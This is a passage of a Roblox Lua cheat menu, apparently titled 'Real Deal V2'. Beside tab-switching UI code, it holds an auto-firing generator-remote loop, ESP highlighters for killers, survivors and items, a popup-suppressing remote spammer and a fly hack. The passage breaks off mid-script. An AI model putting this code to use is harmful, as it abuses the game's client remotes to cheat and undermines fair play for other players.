local function C_4d()
local script = G2L["4d"];
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("Open").Visible = true
	end)
end;
task.spawn(C_4d);
-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.General.LocalScript
local function C_53()
local script = G2L["53"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local tabs = button.Parent.Parent:WaitForChild("THETABS")
	local extra = tabs:WaitForChild("General")
	
	button.MouseButton1Down:Connect(function()
		-- Hide all tabs first
		for _, v in pairs(tabs:GetChildren()) do
			v.Visible = false
		end
	
		-- Make Extra visible for the tween
		extra.Visible = true
		extra.Position = UDim2.new(0.997, 0, 0.087, 0) -- starting position
	
		-- Create tween
		local tweenInfo = TweenInfo.new(
			0.4, -- duration (in seconds)
			Enum.EasingStyle.Quint, -- smooth easing
			Enum.EasingDirection.Out
		)
	
		local goal = { Position = UDim2.new(0, 0, 0.087, 0) }
		local tween = TweenService:Create(extra, tweenInfo, goal)
	
		-- Play tween
		tween:Play()
	end)
	
end;
task.spawn(C_53);
-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Fun.LocalScript
local function C_56()
local script = G2L["56"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local tabs = button.Parent.Parent:WaitForChild("THETABS")
	local extra = tabs:WaitForChild("Fun")
	
	button.MouseButton1Down:Connect(function()
		-- Hide all tabs first
		for _, v in pairs(tabs:GetChildren()) do
			v.Visible = false
		end
	
		-- Make Extra visible for the tween
		extra.Visible = true
		extra.Position = UDim2.new(0.997, 0, 0.087, 0) -- starting position
	
		-- Create tween
		local tweenInfo = TweenInfo.new(
			0.4, -- duration (in seconds)
			Enum.EasingStyle.Quint, -- smooth easing
			Enum.EasingDirection.Out
		)
	
		local goal = { Position = UDim2.new(0, 0, 0.087, 0) }
		local tween = TweenService:Create(extra, tweenInfo, goal)
	
		-- Play tween
		tween:Play()
	end)
	
end;
task.spawn(C_56);
-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Stamina.LocalScript
local function C_5a()
local script = G2L["5a"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local tabs = button.Parent.Parent:WaitForChild("THETABS")
	local extra = tabs:WaitForChild("Stamina")
	
	button.MouseButton1Down:Connect(function()
		-- Hide all tabs first
		for _, v in pairs(tabs:GetChildren()) do
			v.Visible = false
		end
	
		-- Make Extra visible for the tween
		extra.Visible = true
		extra.Position = UDim2.new(0.997, 0, 0.087, 0) -- starting position
	
		-- Create tween
		local tweenInfo = TweenInfo.new(
			0.4, -- duration (in seconds)
			Enum.EasingStyle.Quint, -- smooth easing
			Enum.EasingDirection.Out
		)
	
		local goal = { Position = UDim2.new(0, 0, 0.087, 0) }
		local tween = TweenService:Create(extra, tweenInfo, goal)
	
		-- Play tween
		tween:Play()
	end)
	
end;
task.spawn(C_5a);
-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Extra.LocalScript
local function C_5d()
local script = G2L["5d"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local tabs = button.Parent.Parent:WaitForChild("THETABS")
	local extra = tabs:WaitForChild("Extra")
	
	button.MouseButton1Down:Connect(function()
		-- Hide all tabs first
		for _, v in pairs(tabs:GetChildren()) do
			v.Visible = false
		end
	
		-- Make Extra visible for the tween
		extra.Visible = true
		extra.Position = UDim2.new(0.997, 0, 0.087, 0) -- starting position
	
		-- Create tween
		local tweenInfo = TweenInfo.new(
			0.4, -- duration (in seconds)
			Enum.EasingStyle.Quint, -- smooth easing
			Enum.EasingDirection.Out
		)
	
		local goal = { Position = UDim2.new(0, 0, 0.087, 0) }
		local tween = TweenService:Create(extra, tweenInfo, goal)
	
		-- Play tween
		tween:Play()
	end)
	
end;
task.spawn(C_5d);
-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.About.LocalScript
local function C_60()
local script = G2L["60"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local tabs = button.Parent.Parent:WaitForChild("THETABS")
	local extra = tabs:WaitForChild("About")
	
	button.MouseButton1Down:Connect(function()
		-- Hide all tabs first
		for _, v in pairs(tabs:GetChildren()) do
			v.Visible = false
		end
	
		-- Make Extra visible for the tween
		extra.Visible = true
		extra.Position = UDim2.new(0.997, 0, 0.087, 0) -- starting position
	
		-- Create tween
		local tweenInfo = TweenInfo.new(
			0.4, -- duration (in seconds)
			Enum.EasingStyle.Quint, -- smooth easing
			Enum.EasingDirection.Out
		)
	
		local goal = { Position = UDim2.new(0, 0, 0.087, 0) }
		local tween = TweenService:Create(extra, tweenInfo, goal)
	
		-- Play tween
		tween:Play()
	end)
	
end;
task.spawn(C_60);
-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Credits.LocalScript
local function C_63()
local script = G2L["63"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local tabs = button.Parent.Parent:WaitForChild("THETABS")
	local extra = tabs:WaitForChild("Credits")
	
	button.MouseButton1Down:Connect(function()
		-- Hide all tabs first
		for _, v in pairs(tabs:GetChildren()) do
			v.Visible = false
		end
	
		-- Make Extra visible for the tween
		extra.Visible = true
		extra.Position = UDim2.new(0.997, 0, 0.087, 0) -- starting position
	
		-- Create tween
		local tweenInfo = TweenInfo.new(
			0.4, -- duration (in seconds)
			Enum.EasingStyle.Quint, -- smooth easing
			Enum.EasingDirection.Out
		)
	
		local goal = { Position = UDim2.new(0, 0, 0.087, 0) }
		local tween = TweenService:Create(extra, tweenInfo, goal)
	
		-- Play tween
		tween:Play()
	end)
	
end;
task.spawn(C_63);
-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.STOPSKIDDIN.LocalScript
local function C_66()
local script = G2L["66"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local tabs = button.Parent.Parent:WaitForChild("THETABS")
	local extra = tabs:WaitForChild("STOPSKIDDIN")
	
	button.MouseButton1Down:Connect(function()
		-- Hide all tabs first
		for _, v in pairs(tabs:GetChildren()) do
			v.Visible = false
		end
	
		-- Make Extra visible for the tween
		extra.Visible = true
		extra.Position = UDim2.new(0.997, 0, 0.087, 0) -- starting position
	
		-- Create tween
		local tweenInfo = TweenInfo.new(
			0.4, -- duration (in seconds)
			Enum.EasingStyle.Quint, -- smooth easing
			Enum.EasingDirection.Out
		)
	
		local goal = { Position = UDim2.new(0, 0, 0.087, 0) }
		local tween = TweenService:Create(extra, tweenInfo, goal)
	
		-- Play tween
		tween:Play()
	end)
	
end;
task.spawn(C_66);
-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Admin Mode.LocalScript
local function C_69()
local script = G2L["69"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local tabs = button.Parent.Parent:WaitForChild("THETABS")
	local extra = script.Parent.Parent.Parent.Parent.Parent:WaitForChild("PremiumMode"):WaitForChild("CanvasGroup") -- dep
	local lastpos = script.Parent.Parent.Parent.Parent.Parent:WaitForChild("PremiumMode"):WaitForChild("CanvasGroup").Position -- dep
	local lastposY = script.Parent.Parent.Parent.Parent.Parent:WaitForChild("PremiumMode"):WaitForChild("CanvasGroup").Position.Y -- dep
	local newextra = tabs:WaitForChild("Admin")
	
	
	button.MouseButton1Down:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent:WaitForChild("UhmUhUhAdminMode?"):GetAttribute("what") == false then
			-- Hide all tabs first
		for _, v in pairs(tabs:GetChildren()) do
			v.Visible = false
		end
	
		-- Make Extra visible for the tween
		extra.Position = UDim2.new(1, 0,lastposY) -- starting position
	
		-- Create tween
		local tweenInfo = TweenInfo.new(
			0.7, -- duration (in seconds)
			Enum.EasingStyle.Quint, -- smooth easing
			Enum.EasingDirection.Out
		)
	
		local goal = { Position = lastpos}
		local tween = TweenService:Create(extra, tweenInfo, goal)
	
		-- Play tween
		tween:Play()
		else
			-- Hide all tabs first
			for _, v in pairs(tabs:GetChildren()) do
				v.Visible = false
			end
	
			-- Make Extra visible for the tween
			newextra.Visible = true
			newextra.Position = UDim2.new(0.997, 0, 0.087, 0) -- starting position
	
			-- Create tween
			local tweenInfo = TweenInfo.new(
				0.7, -- duration (in seconds)
				Enum.EasingStyle.Quint, -- smooth easing
				Enum.EasingDirection.Out
			)
	
			local goal = { Position = UDim2.new(0, 0, 0.087, 0) }
			local tween = TweenService:Create(newextra, tweenInfo, goal)
	
			-- Play tween
			tween:Play()
		end
	end)
	
end;
task.spawn(C_69);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.GensSolver.ImageButton.LocalScript
local function C_6f()
local script = G2L["6f"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
	
		-- toggle global state
		if _G.asdasdasdasdasdaljhsd == true then
			_G.asdasdasdasdasdaljhsd = false
			return
		end
		_G.asdasdasdasdasdaljhsd = true
	
		task.spawn(function()
			while _G.asdasdasdasdasdaljhsd do
				-- safely fetch map each time (handles deletion)
				local map = workspace:FindFirstChild("Map")
				local ingame = map and map:FindFirstChild("Ingame")
				local genmap = ingame and ingame:FindFirstChild("Map")
	
				-- skip if anything is missing
				if not genmap then
					task.wait(0.5)
					continue
				end
	
				-- get genspeed from slider if exists
				local slider = script.Parent.Parent.Parent:FindFirstChild("Slider")
				local genspeed = 1.25
				if slider and slider:FindFirstChild("Slider") and slider.Slider:FindFirstChild("Trigger") then
					genspeed = slider.Slider.Trigger:GetAttribute("OutputValue") or 1.25
				end
	
				-- iterate all generators that exist *right now*
				for _, obj in ipairs(genmap:GetChildren()) do
					if obj.Name == "Generator" then
						local remotes = obj:FindFirstChild("Remotes")
						if remotes and remotes:FindFirstChild("RE") then
							-- re-fetch every time so new maps/generators always work
							pcall(function()
								remotes.RE:FireServer()
							end)
						end
					end
				end
	
				task.wait(genspeed)
			end
		end)
	end)
	
	-- stop when exit button pressed
	script.Parent.Parent.Parent.Parent:WaitForChild("Fun"):WaitForChild("Exit"):WaitForChild("ImageButton").MouseButton1Down:Connect(function()
		_G.asdasdasdasdasdaljhsd = false
	end)
	
end;
task.spawn(C_6f);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.GensHighlighter.ImageButton.LocalScript
local function C_73()
local script = G2L["73"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local loop = false
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	button.MouseButton1Click:Connect(function()
		loop = true
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
		while loop do
			local genparent = workspace:WaitForChild("Map"):WaitForChild("Ingame"):WaitForChild("Map")
		if button:GetAttribute("toggle") == false then
		for _, gen in pairs(genparent:GetChildren()) do
			if gen.Name == "Generator" or gen.Name == "FakeGenerator" then
				for _, obj in pairs(gen:GetChildren()) do
					if obj:IsA("Highlight") then
						obj:Destroy()
					end
				end
			end
		end
		return
			end
		
			for _, obj in pairs(genparent:GetChildren()) do
				if obj.Name == "Generator" then
					local highlight = Instance.new("Highlight")
					highlight.Adornee = obj
					highlight.OutlineTransparency = 0
					highlight.FillTransparency = 0.45
					highlight.Parent = obj
	
					-- Update highlight color every 0.1s
					task.spawn(function()
						while newState and highlight.Parent do
							if obj:FindFirstChild("Progress") and obj.Progress:IsA("NumberValue") then
								if obj.Progress.Value >= 100 then
									highlight.FillColor = Color3.fromRGB(0, 255, 42)
									highlight.OutlineColor = Color3.fromRGB(0, 255, 42)
								else
									highlight.FillColor = Color3.fromRGB(238, 255, 10)
									highlight.OutlineColor = Color3.fromRGB(238, 255, 10)
								end
							end
							task.wait(0.1)
						end
					end)
				end
	
				if obj.Name == "FakeGenerator" then
					local highlight = Instance.new("Highlight")
					highlight.Adornee = obj
					highlight.OutlineTransparency = 0
					highlight.FillTransparency = 0.45
					highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
					highlight.FillColor = Color3.fromRGB(255, 0, 0)
					highlight.Parent = obj
				end
			end
			task.wait(2)
		end
		loop = false
	end)
	script.Parent.Parent.Parent.Parent:WaitForChild("Fun"):WaitForChild("Exit"):WaitForChild("ImageButton").MouseButton1Down:Connect(function()
		loop = false
		local genparent = workspace:WaitForChild("Map"):WaitForChild("Ingame"):WaitForChild("Map")
		local plrparent = workspace:WaitForChild("Players")
		for _, gen in pairs(genparent:GetChildren()) do
			if gen.Name == "Generator" or gen.Name == "FakeGenerator" then
				for _, obj in pairs(gen:GetChildren()) do
					if obj:IsA("Highlight") then
						obj:Destroy()
					end
				end
			end
		end
		return
	end)
end;
task.spawn(C_73);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.ItemHighlighter.ImageButton.LocalScript
local function C_77()
local script = G2L["77"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local loop = false
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	button.MouseButton1Click:Connect(function()
		loop = true
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
	
		while loop do
			local itmparent = workspace:WaitForChild("Map"):WaitForChild("Ingame"):WaitForChild("Map")
	
			if button:GetAttribute("toggle") == false then
				for _, obj in pairs(itmparent:GetChildren()) do
					if obj.Name == "BloxyCola" or obj.Name == "Medkit" then
						for _, child in pairs(obj:GetChildren()) do
							if child:IsA("Highlight") then
								child:Destroy()
							end
						end
					end
				end
				return
			end
	
			for _, obj in pairs(itmparent:GetChildren()) do
				if obj.Name == "BloxyCola" then
					local highlight = Instance.new("Highlight")
					highlight.Adornee = obj
					highlight.FillTransparency = 0.6
					highlight.OutlineTransparency = 0
					highlight.FillColor = Color3.fromRGB(100, 20, 255)
					highlight.OutlineColor = Color3.fromRGB(100, 20, 255)
					highlight.Parent = obj
				elseif obj.Name == "Medkit" then
					local highlight = Instance.new("Highlight")
					highlight.Adornee = obj
					highlight.FillTransparency = 0.6
					highlight.OutlineTransparency = 0
					highlight.FillColor = Color3.fromRGB(30, 20, 220)
					highlight.OutlineColor = Color3.fromRGB(30, 20, 220)
					highlight.Parent = obj
				end
			end
	
			task.wait(2)
		end
	
		loop = false
	end)
	script.Parent.Parent.Parent.Parent:WaitForChild("Fun"):WaitForChild("Exit"):WaitForChild("ImageButton").MouseButton1Down:Connect(function()
		loop = false
		local itmparent = workspace:WaitForChild("Map"):WaitForChild("Ingame"):WaitForChild("Map")
		for _, obj in pairs(itmparent:GetChildren()) do
			if obj.Name == "BloxyCola" or obj.Name == "Medkit" then
				for _, child in pairs(obj:GetChildren()) do
					if child:IsA("Highlight") then
						child:Destroy()
					end
				end
			end
		end
		return
	end)
end;
task.spawn(C_77);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.PlayerHighlighter.ImageButton.LocalScript
local function C_7b()
local script = G2L["7b"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local loop = false
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	button.MouseButton1Click:Connect(function()
		loop = true
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
	
		local function highlightNoli()
			local killers = workspace:WaitForChild("Players"):WaitForChild("Killers")
			for _, v in pairs(killers:GetChildren()) do
				if v.Name == "Noli" then
					local speedmultiplier = v:WaitForChild("SpeedMultipliers")
	
					-- remove old highlights
					for _, child in pairs(v:GetDescendants()) do
						if child:IsA("Highlight") then
							child:Destroy()
						end
					end
	
					-- create new highlight
					local highlight = Instance.new("Highlight")
					highlight.Adornee = v
					highlight.FillTransparency = 0.6
					highlight.OutlineTransparency = 0
	
					if #speedmultiplier:GetChildren() == 0 then
						highlight.FillColor = Color3.fromRGB(255, 0, 0)
						highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
					else
						highlight.FillColor = Color3.fromRGB(255, 255, 0)
						highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
					end
	
					highlight.Parent = v
					return
				end
			end
		end
	
	
	
		while loop do
			local plrparent = workspace:WaitForChild("Players")
	
			if button:GetAttribute("toggle") == false then
				for _, killer in pairs(plrparent:WaitForChild("Killers"):GetChildren()) do
					for _, obj in pairs(killer:GetChildren()) do
						if obj:IsA("Highlight") then
							obj:Destroy()
						end
					end
				end
				for _, survivor in pairs(plrparent:WaitForChild("Survivors"):GetChildren()) do
					for _, obj in pairs(survivor:GetChildren()) do
						if obj:IsA("Highlight") then
							obj:Destroy()
						end
					end
				end
				return
			end
	
			-- inside the loop where you highlight killers
			for _, killer in pairs(plrparent:WaitForChild("Killers"):GetChildren()) do
				if killer.Name ~= "Noli" then -- skip Noli
					local highlight = Instance.new("Highlight")
					highlight.Adornee = killer
					highlight.FillTransparency = 0.6
					highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
					highlight.FillColor = Color3.fromRGB(255, 0, 0)
					highlight.OutlineTransparency = 0
					highlight.Parent = killer
				end
			end
	
			for _, survivor in pairs(plrparent:WaitForChild("Survivors"):GetChildren()) do
				local highlight = Instance.new("Highlight")
				highlight.Adornee = survivor
				highlight.FillTransparency = 0.6
				highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
				highlight.FillColor = Color3.fromRGB(255, 255, 255)
				highlight.OutlineTransparency = 0
				highlight.Parent = survivor
			end
	
			-- call Noli highlight function inside loop
			highlightNoli()
	
			task.wait(2)
		end
	
		loop = false
	end)
	
	script.Parent.Parent.Parent.Parent:WaitForChild("Fun"):WaitForChild("Exit"):WaitForChild("ImageButton").MouseButton1Down:Connect(function()
		loop = false
		local plrparent = workspace:WaitForChild("Players")
		for _, killer in pairs(plrparent:WaitForChild("Killers"):GetChildren()) do
			for _, obj in pairs(killer:GetChildren()) do
				if obj:IsA("Highlight") then
					obj:Destroy()
				end
			end
		end
		for _, survivor in pairs(plrparent:WaitForChild("Survivors"):GetChildren()) do
			for _, obj in pairs(survivor:GetChildren()) do
				if obj:IsA("Highlight") then
					obj:Destroy()
				end
			end
		end
		return
	end)
	
end;
task.spawn(C_7b);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Chat Enabler/Disabler.ImageButton.LocalScript
local function C_7f()
local script = G2L["7f"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local chat = game:WaitForChild("TextChatService"):WaitForChild("ChatWindowConfiguration")
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
	
		if button:GetAttribute("toggle") == true then
			chat.Enabled = true
		elseif button:GetAttribute("toggle") == false then
			chat.Enabled = false
		end
	end)
end;
task.spawn(C_7f);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Do1Gen.TextButton.LocalScript
local function C_83()
local script = G2L["83"];
	script.Parent.MouseButton1Down:Connect(function()
		local map = workspace:FindFirstChild("Map")
		local ingame = map and map:FindFirstChild("Ingame")
		local genmap = ingame and ingame:FindFirstChild("Map")
	
		for _, obj in ipairs(genmap:GetChildren()) do
			if obj.Name == "Generator" then
				local remotes = obj:FindFirstChild("Remotes")
				if remotes and remotes:FindFirstChild("RE") then
					-- re-fetch every time so new maps/generators always work
					pcall(function()
						remotes.RE:FireServer()
					end)
				end
			end
		end
	end)
end;
task.spawn(C_83);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.Slider.LocalScript
local function C_87()
local script = G2L["87"];
	local mouse = game.Players.LocalPlayer:GetMouse()
	local slider = script.Parent.Parent:WaitForChild("Slider")
	local fill = script.Parent:WaitForChild("Fill")
	local Trigger = script.Parent:WaitForChild("Trigger")
	local OutputValue = Trigger
	local OutputLabel = script.Parent:WaitForChild("OuputLabel")
	local MinValue_or_StartingValue = 1.25
	local MaxValue = 5
	local NoNeedToSeeHere = 0
	
	-- initialize attribute
	OutputValue:SetAttribute("OutputValue", MinValue_or_StartingValue)
	local OutputValueGet = MinValue_or_StartingValue
	OutputLabel.Text = tostring(OutputValueGet)
	
	local WholeNumbersOrDecimals = --[["WholeNumbers"]] --[[or]] "Decimals"
	
	if WholeNumbersOrDecimals == "WholeNumbers" then
		NoNeedToSeeHere = 1
	elseif WholeNumbersOrDecimals == "Decimals" then
		NoNeedToSeeHere = 100
	end
	
	-- fill size helper (compute ratio 0-1)
	local function valueToRatio(v)
		return math.clamp((v - MinValue_or_StartingValue) / (MaxValue - MinValue_or_StartingValue), 0, 1)
	end
	
	-- set initial fill to match starting value
	fill.Size = UDim2.fromScale(valueToRatio(OutputValueGet), 1)
	
	local TweenService = game:GetService("TweenService")
	local TweenStyle = TweenInfo.new(0.4, Enum.EasingStyle.Exponential)
	
	local function roundToDecimal(num, decimals)
		local mult = 10 ^ decimals
		return math.floor(num * mult + 0.5) / mult
	end
	
	function updateSlider()
		local output = math.clamp((mouse.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X, 0, 1)
		local outputClamped = MinValue_or_StartingValue + (output * (MaxValue - MinValue_or_StartingValue))
	
		if OutputValueGet ~= outputClamped then
			TweenService:Create(fill, TweenStyle, {Size = UDim2.fromScale(output, 1)}):Play()
		end
	
		OutputValueGet = outputClamped
	
		if WholeNumbersOrDecimals == "WholeNumbers" then
			OutputValue:SetAttribute("OutputValue", math.round(OutputValueGet))
		elseif WholeNumbersOrDecimals == "Decimals" then
			OutputValue:SetAttribute("OutputValue", roundToDecimal(OutputValueGet, 2))
		end
	
		OutputLabel.Text = tostring(OutputValue:GetAttribute("OutputValue"))
	end
	
	local sliderActivate = false
	
	function activateSlider()
		sliderActivate = true
		while sliderActivate do
			updateSlider()
			task.wait()
		end
	end
	
	Trigger.MouseButton1Down:Connect(activateSlider)
	
	game:GetService("UserInputService").InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			sliderActivate = false
		end
	end)
	
	slider.ClipsDescendants = true
	
end;
task.spawn(C_87);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Auto one egg's popup LMA0.ImageButton.LocalScript
local function C_93()
local script = G2L["93"];
	local UIS = game:GetService("UserInputService")
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local exitButton = script.Parent.Parent.Parent.Parent:WaitForChild("Fun"):WaitForChild("Exit"):WaitForChild("ImageButton")
	
	-- Initialize toggle
	local looping = false
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	-- Toggle button
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
		looping = newState
	end)
	
	-- Loop task
	task.spawn(function()
		while true do
			if looping then
				local player = Players.LocalPlayer
				local tempUI = player:WaitForChild("PlayerGui"):WaitForChild("TemporaryUI")
	
				for _, i in pairs(tempUI:GetChildren()) do
					if i.Name == "1x1x1x1Popup" then
						i:Destroy()
					end
				end
	
				ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer("Entangled", {})
			end
			task.wait(0.1) -- small wait to prevent freezing
		end
	end)
	
	-- Exit button
	exitButton.MouseButton1Down:Connect(function()
		looping = false
		button:SetAttribute("toggle", false)
		button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	end)
	
end;
task.spawn(C_93);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Fly.ImageButton.LocalScript
local function C_98()
local script = G2L["98"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local generators = {}
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	
	local player = Players.LocalPlayer
	local UP_KEY = Enum.KeyCode.V
	local DOWN_KEY = Enum.KeyCode.C
	local BASE_SPEED = 80
	local VERTICAL_SPEED = 60
	local SMOOTHING = 8
	
	local flying = false
	local keysDown = {}
	local bv, bg
	local character, hrp, humanoid
	local velocity = Vector3.new(0,0,0)
	
	local function ensureReferences()
		character = player.Character
		if not character then return false end
		hrp = character:FindFirstChild("HumanoidRootPart")
		humanoid = character:FindFirstChildWhichIsA("Humanoid")
		return hrp ~= nil
	end
	
	local function createBodyMovers()
		if not hrp then return end
		removeBodyMovers()
		bv = Instance.new("BodyVelocity")
		bv.MaxForce = Vector3.new(1e5,1e5,1e5) * 1000
		bv.Velocity = Vector3.new(0,0,0)
		bv.P = 3000
		bv.Parent = hrp
	
		bg = Instance.new("BodyGyro")
		bg.MaxTorque = Vector3.new(1e5,1e5,1e5)
		bg.P = 3000
		bg.D = 100
		bg.CFrame = hrp.CFrame
		bg.Parent = hrp
	end
	
	function removeBodyMovers()
		if bv then pcall(function() bv:Destroy() end) end
		bv = nil
		if bg then pcall(function() bg:Destroy() end) end
		bg = nil
	end
	
	local function setFlying(state)
		if state == flying then return end
		flying = state
	
		if not ensureReferences() then
			flying = false
			return
		end
	
		if flying then
			createBodyMovers()
			if humanoid then humanoid.PlatformStand = true end
			velocity = Vector3.new(0,0,0)
		else
			removeBodyMovers()
			if humanoid then humanoid.PlatformStand = false end
		end
	end
	
	-- Button click toggles flying
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
		setFlying(newState)
	end)
	
	-- Key tracking (only for movement, not toggle)
	UserInputService.InputBegan:Connect(function(input, processed)
		if processed then return end
		if input.UserInputType == Enum.UserInputType.Keyboard then
			keysDown[input.KeyCode] = true
		end
	end)
	
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Keyboard then
			keysDown[input.KeyCode] = nil
		end
	end)
	
	-- RunService loop (only once)
	RunService.Heartbeat:Connect(function(dt)
		if not flying then return end
		if not ensureReferences() then
			setFlying(false)
			return
		end
	
		local cam = workspace.CurrentCamera
		local forward = Vector3.new(cam.CFrame.LookVector.X,0,cam.CFrame.LookVector.Z)
		if forward.Magnitude > 0 then forward = forward.Unit else forward = Vector3.new(0,0,-1) end
		local right = Vector3.new(cam.CFrame.RightVector.X,0,cam.CFrame.RightVector.Z)
		if right.Magnitude > 0 then right = right.Unit else right = Vector3.new(1,0,0) end
	
		local inputDir = Vector3.new(0,0,0)
		if keysDown[Enum.KeyCode.W] then inputDir = inputDir + forward end
		if keysDown[Enum.KeyCode.S] then inputDir = inputDir - forward end
		if keysDown[Enum.KeyCode.D] then inputDir = inputDir + right end
		if keysDown[Enum.KeyCode.A] then inputDir = inputDir - right end
	
		local vert = 0
		if keysDown[UP_KEY] then vert = vert + 1 end
		if keysDown[DOWN_KEY] then vert = vert - 1 end
	
		local horiz = Vector3.new(inputDir.X,0,inputDir.Z)
		local horizMag = horiz.Magnitude
		if horizMag > 1 then horiz = horiz.Unit; horizMag = 1 end
	
		local targetVel = horiz * (BASE_SPEED * horizMag) + Vector3.new(0, vert * VERTICAL_SPEED, 0)
	
		local blend = 1 - math.exp(-SMOOTHING * dt)
		velocity = velocity:Lerp(targetVel, blend)
	
		if bv then bv.Velocity = velocity end
		if bg and hrp then
			local targetCFrame = CFrame.new(hrp.Position, hrp.Position + workspace.CurrentCamera.CFrame.LookVector)
			bg.CFrame = bg.CFrame:Lerp(targetCFrame, math.clamp(blend*2,0,1))
		end
	end)
	
	-- Respawn handling
	local function onCharacterAdded(char)
		character = char
		hrp = nil
		humanoid = nil
		hrp = char:WaitForChild("HumanoidRootPart",5)
		humanoid = char:FindFirstChildWhichIsA("Humanoid")
		if flying and hrp then
			removeBodyMovers()
			createBodyMovers()
			if humanoid then humanoid.PlatformStand = true end
		end
	end
	
	player.CharacterAdded:Connect(onCharacterAdded)
	if player.Character then onCharacterAdded(player.Character) end
	
	player.AncestryChanged:Connect(function()
		if not player:IsDescendantOf(game) then removeBodyMovers() end
	end)
	
end;
task.spawn(C_98);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.PlayerTpUICreate.ImageButton.LocalScript
local function C_9c()
local script = G2L["9c"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local genparent = workspace:WaitForChild("Map"):WaitForChild("Ingame"):WaitForChild("Map")
	local generators = {}
	local exitted = script.Parent.Parent:WaitForChild("ImageButton")
	
	exitted:SetAttribute("exitted", true)
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
